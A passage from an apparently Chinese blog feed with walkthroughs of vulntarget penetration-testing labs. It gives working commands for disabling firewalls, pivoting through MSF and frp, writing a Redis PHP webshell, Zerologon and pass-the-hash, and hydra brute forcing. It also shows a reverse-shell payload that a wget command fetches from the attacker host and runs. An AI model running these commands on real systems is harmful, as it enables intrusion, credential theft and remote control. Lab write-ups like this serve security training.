class="hljs-comment">#查看防火墙状态</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">netsh advfirewall <span class="hljs-built_in">set</span>  allprofile state off  <span class="hljs-comment">#关闭防火墙</span></span><br><span class="hljs-meta prompt_">meterpreter&gt;</span><span class="language-bash">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f    <span class="hljs-comment">#使用注册表开启3389</span></span><br><br></code></pre></td></tr></table></figure><p>使用<code>arp -a</code>发现内网中还存在一台IP为10.0.20.99 的机器</p><p><img src="/posts/d6f0653f/image-20230622161715896.png" alt="image-20230622161715896"></p><p>此时想在kali中对内网主机中的99机器进行操作，而99机器并不连接外网，只能在98机器上对其进行连接。此时就需要利用MSF来创建路由，通过路由将kali与内网中的99机器连接。</p><p><img src="/posts/d6f0653f/image-20230622161813160.png" alt="image-20230622161813160"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#添加路由</span><br>use post/multi/manage/autoroute<br><span class="hljs-built_in">set</span> session 1    #输入‘sessions’查看当前会话ID<br><span class="hljs-built_in">run</span><br><span class="hljs-comment">#扫描存活主机</span><br>use post/windows/gather/arp_scanner<br><span class="hljs-built_in">set</span> session 1<br><span class="hljs-built_in">set</span> rhosts 10.0.20.1-254<br><span class="hljs-built_in">run</span><br><span class="hljs-comment">#添加代理</span><br>use auxiliary/server/socks_proxy<br><span class="hljs-built_in">run</span><br><span class="hljs-comment">#扫描目标端口</span><br>use auxiliary/scanner/portscan/tcp<br><span class="hljs-built_in">set</span> ports 22-500,8000-10000<br><span class="hljs-built_in">set</span> rhosts 10.0.20.99<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure><p><img src="/posts/d6f0653f/1658109974190-4da290de-e000-48c7-ba9f-8180c9054618.png" alt="image.png"></p><p><img src="/posts/d6f0653f/1658110384777-20281a01-ea7a-4153-b3df-3da7269dd5a8.png" alt="image.png"></p><p>此时域成员主机开启了HTTP服务但是只有边界主机可以进行访问，而我们的kali无法进行访问，此时就需要在边界主机和攻击机搭建一个通信隧道来使得攻击机可以通过HTTP协议访问内网域成员主机。</p><p><img src="/posts/d6f0653f/image-20230622174333567.png" alt="image-20230622174333567"></p><p>这里我们使用frp进行隧道的搭建。利用隧道我们可以实现端口的转发和流量的代理。</p><p><img src="/posts/d6f0653f/image-20230622175028245.png" alt="image-20230622175028245"></p><p>我们需要将frpc（客户端）部署到目标机器上，而将frps部署到黑客的VPS(或者kali中)上。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#frps.ini</span><br>[common]<br>bind_port = 7100<br><br><span class="hljs-comment">#frpc.ini</span><br>[common]<br>server_addr = 192.168.172.129   <span class="hljs-comment">#外网vps地址，即服务端地址，这里为MSF的地址</span><br>server_port = 7100         <span class="hljs-comment">#与服务端建立连接的端口，需与服务端上的frps.ini保持一致</span><br>[plugin_socks]<br>type = tcp   <br>remote_port = 8090      <span class="hljs-comment">#配置攻击主机socks代理时的代理端口</span><br>plugin = socks5                <span class="hljs-comment">#实战中使用socks5代理</span><br>use_encryption = true    <span class="hljs-comment">#是否使用加密</span><br>use_compression = true    <span class="hljs-comment">#是否进行压缩</span><br><span class="hljs-comment">#注意事项</span><br>配置文件中填写时需要把注释符号去掉<br></code></pre></td></tr></table></figure><p>先在kali中执行<code>./frps -c frps.ini</code></p><p>再在目标主机上执行<code>frpc.exe -c frpc.ini </code></p><p><img src="/posts/d6f0653f/image-20230622180402415.png" alt="image-20230622180402415"></p><p>出现如上图所示表面搭建成功了。</p><p>正常情况下搭建好通信隧道应该用SocksCap64等工具进行利用，但是在kali中有一款工具为<em><strong>proxychains4</strong></em>来利用通信隧道。</p><p>首先配置proxychains4的代理服务器的配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">编辑Proxychains配置文件</span><br>vi /etc/proxychain4.conf<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置信息</span><br>socks5 127.0.0.1 8090<br>//socks5 MSF地址 代理端口 账号 密码<br><span class="hljs-meta prompt_">#</span><span class="language-bash">测试链接</span><br>proxychains4 curl http://10.0.20.99/<br></code></pre></td></tr></table></figure><p>也可以使用火狐浏览器的代理插件配置如下：</p><p><img src="/posts/d6f0653f/image-20230622181739922.png" alt="image-20230622181739922"></p><p>在火狐浏览器中访问10.0.20.99也可以成功。</p><p><img src="/posts/d6f0653f/image-20230622181938348.png" alt="image-20230622181938348"></p><p>此时我们已经可以访问99机器，这时我们利用工具<em><strong>dirsearch</strong></em></p><p>对网站目录进行扫描……</p><p><img src="/posts/d6f0653f/image-20230622182614117.png" alt="image-20230622182614117"></p><p>可以看到是存在l.php/phpinfo.php/index.php三个目录，对其目录进行访问进一步进行信息收集……</p><p><img src="/posts/d6f0653f/image-20230622182833066.png" alt="image-20230622182833066"></p><p><img src="/posts/d6f0653f/image-20230622182853422.png" alt="image-20230622182853422"></p><p>此时可以确定该主机利用phpstudy搭建的web服务，之前扫描中又爆出该主机开放6379端口，为redis的默认端口，redis存在未授权访问漏洞，此时我们尝试连接登录内网主机的Redis服务发现未设置密码，即可尝试写入一句话木马…Success</p><blockquote><p>主要是因为配置不当，导致未授权访问漏洞。进一步将恶意数据写入内存或者磁盘之中，造成更大的危害，配置不当一般主要是两个原理：</p><ol><li>配置登录策略导致任意机器都可以登录 redis。</li><li>未设置密码或者设置弱口令。</li></ol></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">Redis链接</span><br>proxychains4 redis-cli -h 10.0.20.99<br><span class="hljs-meta prompt_">#</span><span class="language-bash">Redis写木马</span><br>config set dir C:/phpStudy/PHPTutorial/WWW/  #调整服务器配置路径<br>config set dbfilename 4pts.php     #生成文件<br>set 1 &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;    #写入文件<br>save   #保存操作<br></code></pre></td></tr></table></figure><p><img src="/posts/d6f0653f/image-20230623082214290.png" alt="image-20230623082214290"></p><p>访问10.0.20.99/4pts.php,发现其中没有set的一句话木马，说明漏洞利用成功。</p><p><img src="/posts/d6f0653f/image-20230623082418143.png" alt="image-20230623082418143"></p><p>之后我们用本地主机的蚁剑去连接。此时无法直接连接，需要走kali的socks5代理，在蚁剑中的代理设置中进行配置：</p><p><img src="/posts/d6f0653f/image-20230623082847322.png" alt="image-20230623082847322"></p><p>代理服务器为kali的IP地址，端口为之前用kali中proxychains4的配置端口。</p><p>测试成功后连接10.0.20.99/4pts.php。继续信息收集一波……</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#执行命令<br>hostname<br>ipconfig /<span class="hljs-keyword">all</span><br>tasklist /svc<br>net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span><br>net <span class="hljs-keyword">group</span> &quot;Domain Computers&quot; /doamin<br>net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span><br>net <span class="hljs-keyword">group</span> &quot;enterprise admins&quot; /<span class="hljs-keyword">domain</span><br>#收集信息<br>OS：Wins16<br>AV:Windows Defender<br><span class="hljs-keyword">Domain</span>:vulntarget.com<br><span class="hljs-keyword">Domain</span> Admins:Administrator<br><span class="hljs-keyword">Domain</span> Controller:WIN2019$<br>NIC:<span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.99</span>/<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.111</span><br></code></pre></td></tr></table></figure><p>发现该机器为win2016并且也有两个网段的网卡，说明还有内网中还有其他机器。</p><p><img src="/posts/d6f0653f/image-20230623083419479.png" alt="image-20230623083419479"></p><p>使用<code>tasklist</code>命令看是否运行着一些防病毒软件。</p><p><img src="/posts/d6f0653f/image-20230623083617809.png" alt="image-20230623083617809"></p><p>确实有一个windows自带的防护软件，此时需要使用命令进行关闭。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netsh firewall set opmode mode=disable<br></code></pre></td></tr></table></figure><p><img src="/posts/d6f0653f/image-20230623084044535.png" alt="image-20230623084044535"></p><p>可以看到公用网络的防火墙确实关闭了，但是域网络防火墙并没有关闭，此时需要利用MSF生成一个正向的木马并对木马进行免杀上传到目标主机。</p><p>这里需要使用<em><strong>viper</strong></em>这款工具来生成免杀木马。</p><p><img src="/posts/d6f0653f/image-20230623104521780.png" alt="image-20230623104521780"></p><p><img src="/posts/d6f0653f/image-20230623104616711.png" alt="image-20230623104616711"></p><p>通过蚁剑上传到目标主机点击执行以后可以看到6666端口被占用说明木马上传成功。</p><p><img src="/posts/d6f0653f/image-20230623104832510.png" alt="image-20230623104832510"></p><p>此时在kali的MSF中打开监听上线木马程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/handler<br>set payload windows/x64/meterpreter/bind_tcp<br>set lport 6666<br>set RHOST 10.0.20.99<br>run<br></code></pre></td></tr></table></figure><p><img src="/posts/d6f0653f/image-20230623105258959.png" alt="image-20230623105258959"></p><p>输入<code>background/bg</code>将该程序放到后台。（因为之前失败了几次导致会话比较乱o(╥﹏╥)o）</p><p><img src="/posts/d6f0653f/image-20230623110514687.png" alt="image-20230623110514687"></p><p>添加路由：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">添加路由</span><br>use post/multi/manage/autoroute<br>set session 4<br></code></pre></td></tr></table></figure><p>添加并修改代理(默认为1080端口)：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#添加代理</span><br>use auxiliary<span class="hljs-regexp">/server/</span>socks_proxy<br>run<br></code></pre></td></tr></table></figure><p>此时我们还要修改proxychains4的代理配置将其端口修改为1080端口，丢弃掉之前用于搭建边界主机通信隧道的frp代理端口。</p><p>（这里当然也可以在win2016中再加一个frp的通信隧道连接2019，但是MSF更加稳定，所以这里通过直接开启MSF的Socks5代理，利用之前在win7和win2016中建立的路由直接访问win2019）</p><h2 id="三、域控"><a class="header-anchor" href="#三、域控">¶</a>三、域控</h2><p>继续进行信息收集：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#域控判断</span><br><span class="hljs-attribute">ipconfig</span> /<span class="hljs-literal">all</span>  --&gt;获取DNS服务器地址：<span class="hljs-number">10.0.10.110</span><br><span class="hljs-attribute">net</span> time /doamian --&gt;获取域控地址：win2019.vulntarget.com<br><span class="hljs-attribute">ping</span> win2019.vulntarget.com --&gt; 返回地址：<span class="hljs-number">10.0.10.110</span><br><span class="hljs-comment">#Nmap扫描</span><br><span class="hljs-attribute">proxychains</span> nmap -Pn -sT -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">445</span>,<span class="hljs-number">139</span> <span class="hljs-number">10.0.10.110</span><br></code></pre></td></tr></table></figure><blockquote><p>至此已经获取内网中域成员服务器也已经定位域控位置，接下来目标就是拿下域控，在此可直接尝试域控漏洞来进行权限提升：</p><ol><li>CVE-2020-1472</li><li>CVE-2022–26923</li><li>CVE-2021-42287&amp;42278</li></ol><p>这里尝试第一种域内提权手法…</p><p>这里需要注意：将proxychains的代理配置改成MSF所起的代理信息…</p></blockquote><p>这里需要准备准备<em><strong>CVE-2020-1472</strong></em>与<em><strong>Impacket</strong></em>下载到Kali主机上…</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#CVE-2021-1472</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/dirkjanm/</span>CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">1472</span><br><span class="hljs-comment">#Impacket</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecureAuthCorp/im</span>packet<br><span class="hljs-comment">#after downlad</span><br>python3 -m pip install -r requirements.txt<br></code></pre></td></tr></table></figure><p>利用CVE-2020-1472打空域控机器的密码……</p><p><img src="/posts/d6f0653f/image-20230623112129672.png" alt="image-20230623112129672"></p><p>绑定通往目标域的Host文件信息并使用<code>impactet</code>获取域控的Hash信息…</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#域名信息编辑</span><br><span class="hljs-attribute">vi</span> /etc/hosts<br><span class="hljs-attribute">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.<span class="hljs-number">110</span> vulntarget.com<br><span class="hljs-comment">#impactet</span><br><span class="hljs-attribute">proxychains</span> python3 secretsdump.py  vulntarget.com/WIN2019\$@<span class="hljs-number">10.0.10.110</span>  -just-dc  -no-pass<br></code></pre></td></tr></table></figure><p>使用抓取的Hash值横向倒域控的CMD下…</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">方式一：<br>proxychains python<span class="hljs-number">3</span> smbexec.py -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">654</span>da<span class="hljs-number">31</span>ce<span class="hljs-number">51</span>cbeecfef<span class="hljs-number">99e637</span>be<span class="hljs-number">15</span> administrator<span class="hljs-title">@10</span>.<span class="hljs-number">0.10</span>.<span class="hljs-number">110</span><br>方式二：<br>proxychains python<span class="hljs-number">3</span> psexec.py vulntarget.com/administrator<span class="hljs-title">@10</span>.<span class="hljs-number">0.10</span>.<span class="hljs-number">110</span> -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">654</span>da<span class="hljs-number">31</span>ce<span class="hljs-number">51</span>cbeecfef<span class="hljs-number">99e637</span>be<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure><p><img src="/posts/d6f0653f/image-20230623113942986.png" alt="image-20230623113942986"></p><p>使用John破解管理员密码…得出密码为<code>Admin@@666</code></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">john <span class="hljs-params">--wordlist=</span><span class="hljs-string">./pass.txt</span> <span class="hljs-string">./hash.txt</span> <span class="hljs-params">--format=NT</span><br></code></pre></td></tr></table></figure><p>开启RDP服务并在防火墙中添加规则对其放行…远程桌面链接！</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment">#开启RDP</span><br>REG ADD <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f<br><span class="hljs-comment">#防火墙放行</span><br>netsh advfirewall firewall add <span class="hljs-keyword">rule</span> name=<span class="hljs-string">&quot;Remote Desktop&quot;</span> protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow<br><span class="hljs-comment">#关闭防火墙</span><br>netsh advfirewall show allprofile <span class="hljs-keyword">state</span>  //查看状态<br>netsh advfirewall <span class="hljs-built_in">set</span>  allprofile <span class="hljs-keyword">state</span> off  //关闭防火墙<br><span class="hljs-comment">#远程链接</span><br>proxychains rdesktop <span class="hljs-number">10.0</span>.<span class="hljs-number">10.110</span><br>username:vulntarget\administrator<br>password:Admin@<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>内网</tag>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulntarget-c打靶复现</title>
    <link href="/posts/64d31b65.html"/>
    <url>/posts/64d31b65.html</url>
    
    <content type="html"><![CDATA[<h1>vulntarget-C靶场复现</h1><h2 id="靶场相关信息"><a class="header-anchor" href="#靶场相关信息">¶</a>靶场相关信息</h2> <img src="/posts/64d31b65/1658220557909-5140e4ce-1eff-45ba-b780-24c0cec931a1.png" class title="img"><blockquote><p>实验目标：拿取Ubuntu 16主机的Flag信息</p></blockquote><blockquote><p>学习目标：Laravel/OVAS-PHP漏洞/隧道代理/免杀/提权/CVE-2021-3129/CVE-2021-3493等</p></blockquote><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#攻击机</span><br>OS：Kali<br><span class="hljs-symbol">NIC:</span><span class="hljs-number">192.168</span><span class="hljs-number">.172</span><span class="hljs-number">.129</span><br><br><span class="hljs-meta">#Ubuntu-Server</span><br><span class="hljs-symbol">OS:</span>Ubuntu <span class="hljs-number">20</span><br><span class="hljs-symbol">Server:</span>Laravel <span class="hljs-number">8.4</span><span class="hljs-number">.2</span><br><span class="hljs-symbol">userpass:</span>root/root<span class="hljs-meta">#qwe</span><br><span class="hljs-symbol">userpass:</span>vulntarget/root<br><span class="hljs-symbol">NIC1:</span><span class="hljs-number">192.168</span><span class="hljs-number">.172</span><span class="hljs-number">.110</span> --&gt;nat模式，桥接不好使<br><span class="hljs-symbol">NIC2:</span><span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.141</span>  --&gt;仅主机模式网卡<br><br><span class="hljs-meta">#Wins16-Server</span><br><span class="hljs-symbol">OS:</span>Windows server <span class="hljs-number">2016</span><br><span class="hljs-symbol">Server:</span>OVAS-PHP CMS<br>userpass：administrator:Admin<span class="hljs-meta">#123</span><br><span class="hljs-symbol">NIC1:</span><span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.100</span>   --&gt;仅主机模式网卡<br><span class="hljs-symbol">NIC2:</span><span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.139</span>    --&gt;仅主机模式网卡<br><br><span class="hljs-meta">#Ubuntu16-Server</span><br><span class="hljs-symbol">OS:</span>Ubuntu <span class="hljs-number">16</span><br>userpass：vulntarget:Admin<span class="hljs-meta">#123</span><br>NIC1：<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.110</span><br><br></code></pre></td></tr></table></figure><h2 id="主机配置"><a class="header-anchor" href="#主机配置">¶</a>主机配置</h2><p>Ubuntu20 配置</p><p>先用用户名和密码登录上去</p><p>修改/etc/netplan下的网络配置文件，将网络ip改成自己的网段ip</p><img src="/posts/64d31b65/image-20230802104152610-1690944115063-3.png" class title="image-20230802104152610"><blockquote><p>****备注：****Netplan —— 抽象网络配置生成器 ，是一个用于配置 Linux 网络的简单工具</p></blockquote><p>生效</p><p><code>netplan apply</code></p><img src="/posts/64d31b65/image-20230802104450384-1690944291966-5.png" class title="image-20230802104450384"><h2 id="边界主机"><a class="header-anchor" href="#边界主机">¶</a>边界主机</h2><p>信息收集</p><p><strong>先nmap探测一下网段环境</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.172.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802104905403-1690944546862-7.png" class title="image-20230802104905403"><p>已经探测出开放着22端口和80端口，猜测后续可以通过ssh连接，并且开启有http服务。进行进行信息搜集。</p><p><strong>探测主机详细信息</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -sT -<span class="hljs-keyword">A</span> -sV  <span class="hljs-number">192.168.172.110</span><br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802110104897-1690945296206-9.png" class title="image-20230802110104897"><p>访问一下80端口的http服务</p><img src="/posts/64d31b65/image-20230802110141191-1690945302072-11.png" class title="image-20230802110141191"><p>Laravel框架，好，没见过，复现结束。。。😤</p><p>不小心看到了版本信息，连上82年的网找找漏洞。</p><p><strong>Laravel v8.78.1 (PHP v7.4.3)</strong></p><p>最新不过2021的，版本好像也不对啊，死马当活马医😫</p><img src="/posts/64d31b65/image-20230802110329245-1690945410528-13.png" class title="image-20230802110329245"><p>Github尝试一下找工具</p><p>还真有，看一下readme如何食用😁</p><p><a href="https://github.com/SNCKER/CVE-2021-3129">https://github.com/SNCKER/CVE-2021-3129</a></p><img src="/posts/64d31b65/image-20230802110541956-1690945543565-15.png" class title="image-20230802110541956"><p>好家伙一个参数没有，估计是写死了，还得改代码，主要是还要另外整gcc估计难搞。</p><p>还得下个别的工具，不好使，换一个。</p><p><a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a></p><p>简单配置试一下</p><img src="/posts/64d31b65/image-20230802110813345-1690945694657-17.png" class title="image-20230802110813345"><p>ok一步到胃！一会儿找找源码中id的执行位置，替换成反弹shell的命令。</p><p>先用美少妇（MSF）生成一个反向马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.172.129 LPORT=6666 -f elf -o 98.elf<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802111015452-1690945816674-19.png" class title="image-20230802111015452"><p>在这个文件夹下用python开个http服务一会儿用工具让靶机下载马子。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m http.server 9090<br></code></pre></td></tr></table></figure><p>访问一下，ok了。</p><img src="/posts/64d31b65/image-20230802111226912-1690945947995-21.png" class title="image-20230802111226912"><p>老规矩MSF开启监听。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp <br>payload =&gt; linux/x64/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; set lhost 192.168.172.129<br>lhost =&gt; 192.168.172.129<br>msf6 exploit(multi/handler) &gt; set lport 6666<br>lport =&gt; 6666<br>msf6 exploit(multi/handler) &gt; run<br></code></pre></td></tr></table></figure><p>用咱们刚下载的工具找到命令执行的位置（找&quot;id&quot;），将其替换为如下语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /var/www/html/public&amp;&amp;wget http://192.168.172.129:9090/98.elf&amp;&amp;chmod 777 98.elf&amp;&amp;./98.elf<br></code></pre></td></tr></table></figure><blockquote><p>坑：需要先cd /var/www/html/public，不然命令执行位置不在下载木马的位置，无法反弹。</p></blockquote><p>上线！😎😎😎</p><img src="/posts/64d31b65/image-20230802111541416-1690946142574-23.png" class title="image-20230802111541416"><p>继续进行信息收集,先看看我是个什么东西。。。</p><img src="/posts/64d31b65/image-20230802111824482-1690946305875-25.png" class title="image-20230802111824482"><p>啥也不是！提权！</p><p>方法一：</p><p>Msf内置后渗透模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run post/multi/recon/local_exploit_suggester<br></code></pre></td></tr></table></figure><p>报了一堆错误，玩不了……</p><p>方法二：</p><p>查看/home目录下用户有哪些。发现存在vulntarget用户尝试使用Hydra进行SSH爆破，获得密码root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -l vulntarget -P passwd.txt 192.168.172.110 ssh<br></code></pre></td></tr></table></figure><img src="/posts/64d31b65/image-20230802112107663-1690946468783-27.png" class title="image-20230802112107663"><img src="/posts/64d31b65/image-20230802112129482-1690946490532-29.png" class title="image-20230802112129482"><p>直接先登上去再说</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh vulntarget@192.168.172.110<br></code></pre></td></tr></table></figure><p>看哪些可以进行权限提升</p><img src="/posts/64d31b65/image-20230802112215184-1690946537265-31.png" class title="image-20230802112215184"><p>python3?整！</p><p>查看/opt/root.py文件内容。运行脚本会在本地的<code>1025-65535</code>端口上开启一个<code>socket</code>接口且密码是<code>mortals</code>登录成功后根据选项给出响应的回显如果有错误的输入在异常处理处打印异常且调用<code>pdb</code>模块，同时进入到调式模块下在此模块中可导入<code>OS</code>模块来执行系统命令完成提权。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> pdb<br><br>port = random.randint(<span 